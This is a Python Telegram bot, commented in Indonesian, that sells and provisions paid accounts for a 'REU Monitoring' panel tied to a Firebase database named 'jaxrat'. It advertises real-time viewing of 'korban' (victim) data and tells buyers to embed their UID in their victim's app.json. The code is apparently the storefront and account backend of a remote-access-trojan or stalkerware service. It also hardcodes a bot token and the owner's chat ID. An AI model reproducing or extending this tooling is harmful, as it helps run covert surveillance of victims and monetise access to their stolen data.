# PATH: /main.py
import os
import telebot
from telebot import types
import firebase_admin
from firebase_admin import credentials, db, auth
import json
import threading
import time
from keep_alive import keep_alive

# ========== KONFIGURASI ==========
BOT_TOKEN = '8019851816:AAFytb4-6Owqdttdhja77wqabJt8p_ZUaho'
OWNER_CHAT_ID = '6754308724'  # Chat ID lo, @deakfta
GROUP_LINK = 'https://t.me/pangeranjendral'  # Link grup lo

# Inisialisasi Bot
bot = telebot.TeleBot(BOT_TOKEN)

# ========== FIREBASE ADMIN SDK ==========
# Lo harus download service account key dari Firebase Console:
# Project Settings -> Service Accounts -> Generate New Private Key -> simpen sebagai 'service-account.json'
# Di Replit, upload file 'service-account.json' atau lo bisa copy-paste isinya ke environment variable
try:
    # Coba load dari file (kalo lo upload manual)
    cred = credentials.Certificate("service-account.json")
    firebase_admin.initialize_app(cred, {
        'databaseURL': 'https://jaxrat-6813c-default-rtdb.firebaseio.com/'
    })
    print("Firebase initialized with service account file.")
except:
    # Kalo ga ada file, ambil dari environment variable (lebih aman)
    service_account_info = json.loads(os.environ.get('FIREBASE_SERVICE_ACCOUNT'))
    cred = credentials.Certificate(service_account_info)
    firebase_admin.initialize_app(cred, {
        'databaseURL': 'https://jaxrat-6813c-default-rtdb.firebaseio.com/'
    })
    print("Firebase initialized with environment variable.")

# Reference ke database
ref_users = db.reference('settings/users_db')  # Tempat nyimpen data user panel
ref_owner_uid = db.reference('settings/owner_uid')  # UID owner di Firebase Auth

# Set Owner UID (isi dengan UID Firebase lo, cek di panel/profile.html nanti)
OWNER_FIREBASE_UID = 'ISI_DENGAN_UID_FIREBASE_LO'  # <-- GANTI INI!
ref_owner_uid.set(OWNER_FIREBASE_UID)
print(f"Owner Firebase UID set to: {OWNER_FIREBASE_UID}")

# ========== FUNGSI BANTU ==========
def is_owner(chat_id):
    return str(chat_id) == OWNER_CHAT_ID

def generate_qr_payment(amount, user_tele_id):
    """Simulasi generate QR pembayaran. Di real, lo bisa integrate API payment."""
    # Ini cuma simulasi, nanti bot cuma kirim teks instruksi transfer
    return f"💰 *INSTRUKSI PEMBAYARAN*\n\nSilakan transfer sebesar Rp{amount:,} ke:\n\n🏦 BANK BCA\nNo Rek: 1234567890\nA/n: REU PROJECT\n\n📌 Kode Unik: {user_tele_id[-5:]}\n\nSetelah transfer, kirim bukti transfer ke admin @deakfta"

def add_new_panel_user(email, password, tele_username, pembayaran_valid=True):
    """Fungsi buat nambah user panel via Firebase Auth dan nyimpen datanya."""
    if not pembayaran_valid:
        return None, "Pembayaran belum valid."
    try:
        # 1. Buat user di Firebase Authentication
        user = auth.create_user(
            email=email,
            password=password
        )
        print(f"Successfully created user: {user.uid}")

        # 2. Simpan data user ke Realtime Database di /settings/users_db/{uid}
        user_data = {
            'email': email,
            'telegram_username': tele_username,
            'created_at': time.time(),
            'status': 'active',
            'uid': user.uid
        }
        ref_users.child(user.uid).set(user_data)
        
        return user.uid, "User berhasil dibuat!"
    except Exception as e:
        return None, f"Error: {str(e)}"

# ========== HANDLER BOT ==========
@bot.message_handler(commands=['start'])
def start(message):
    welcome_msg = f"""
🕵️‍♂️ *Selamat datang di REU BOT!*

Bot ini digunakan untuk mengelola akses panel REU Monitoring.

Harga Akses Panel: **Rp 50.000** (sekali bayar, akses selamanya)

Fitur:
- Akses ke panel monitoring
- Lihat data korban real-time
- Dapat UID sendiri

Ketik /beli untuk memulai proses pembayaran.
"""
    bot.reply_to(message, welcome_msg, parse_mode='Markdown')

@bot.message_handler(commands=['beli'])
def beli(message):
    chat_id = message.chat.id
    username = message.from_user.username or "tidak_ada_username"
    
    # Generate instruksi pembayaran
    payment_info = generate_qr_payment(50000, str(chat_id))
    
    markup = types.InlineKeyboardMarkup()
    btn_confirm = types.InlineKeyboardButton("✅ Saya sudah transfer", callback_data=f"confirm_payment_{chat_id}_{username}")
    markup.add(btn_confirm)
    
    bot.send_message(
        chat_id, 
        payment_info, 
        parse_mode='Markdown',
        reply_markup=markup
    )
    
    # Notifikasi ke owner
    bot.send_message(
        OWNER_CHAT_ID,
        f"🆕 *User minta akses!*\n\nUser: @{username}\nChat ID: {chat_id}\n\nKlik /add_user_{chat_id} untuk nambahin manual setelah transfer masuk.",
        parse_mode='Markdown'
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith('confirm_payment'))
def handle_payment_confirm(call):
    # Ini cuma konfirmasi dari user, tetep harus dicek owner
    _, _, chat_id, username = call.data.split('_')
    bot.answer_callback_query(call.id, "Terima kasih! Admin akan segera memproses setelah transfer masuk.")
    bot.send_message(
        OWNER_CHAT_ID,
        f"💰 *User mengklaim sudah transfer!*\n\nUser: @{username}\nChat ID: {chat_id}\n\nSegera cek mutasi rekening. Kalo udah masuk, tambahin pake:\n/add_user {chat_id} {username}",
        parse_mode='Markdown'
    )

@bot.message_handler(commands=['add_user'])
def add_user(message):
    """Format: /add_user [chat_id_user] [username] [email_user] [password_user]"""
    if not is_owner(message.chat.id):
        bot.reply_to(message, "❌ Lo bukan owner.")
        return
    
    try:
        # Parsing: /add_user 12345678 @username email@user.com password123
        parts = message.text.split()
        if len(parts) != 5:
            bot.reply_to(message, "Format salah! Contoh:\n/add_user 12345678 @username email@user.com password123")
            return
        
        _, target_chat_id, target_username, email, password = parts
        
        # Hapus @ dari username kalo ada
        target_username = target_username.replace('@', '')
        
        # Panggil fungsi buat bikin user di Firebase
        uid, result_msg = add_new_panel_user(email, password, target_username, pembayaran_valid=True)
        
        if uid:
            # Kirim notifikasi ke user yang beli
            bot.send_message(
                target_chat_id,
                f"🎉 *SELAMAT! Akses panel lo sudah aktif!*\n\n"
                f"🔑 *Login Panel:*\n"
                f"Link: https://panel-lo.vercel.app\n"
                f"Email: `{email}`\n"
                f"Password: `{password}`\n\n"
                f"📱 *PENTING!*\n"
                f"UID Firebase lo adalah: `{uid}`\n"
                f"Gunakan UID ini di file `app.json` victim lo.\n\n"
                f"Join grup diskusi: {GROUP_LINK}",
                parse_mode='Markdown'
            )
            
            # Konfirmasi ke owner
            bot.reply_to(message, f"✅ User {target_username} (UID: {uid}) berhasil ditambahkan!")
        else:
            bot.reply_to(message, f"❌ Gagal: {result_msg}")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['list_users'])
def list_users(message):
    if not is_owner(message.chat.id):
        return
    users_data = ref_users.get()
    if not users_data:
        bot.reply_to(message, "Belum ada user.")
        return
    msg = "📋 *Daftar User Panel:*\n\n"
    for uid, data in users_data.items():
        msg += f"- {data.get('email')} (UID: {uid})\n  Tele: @{data.get('telegram_username')}\n"
    bot.reply_to(message, msg, parse_mode='Markdown')

# ========== JALANKAN BOT ==========
if __name__ == '__main__':
    # Panggil keep_alive buat web server dummy (biar Replit nggak mati)
    keep_alive()
    print("Bot polling started...")
    bot.infinity_polling()
